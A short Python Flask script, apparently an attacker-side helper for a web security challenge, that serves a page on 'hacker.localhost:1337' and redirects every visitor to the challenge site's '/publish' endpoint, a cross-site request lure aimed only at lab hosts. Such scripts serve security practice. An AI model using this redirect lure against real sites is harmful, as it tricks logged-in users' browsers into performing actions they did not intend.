import flask

TARGET = "http://challenge.localhost/publish"
HOST = "hacker.localhost"
PORT = 1337

app = flask.Flask(__name__)

@app.route("/")
def home():
  return flask.redirect(TARGET)

app.config['SERVER_NAME'] = "hacker.localhost:1337"
app.run(HOST, PORT)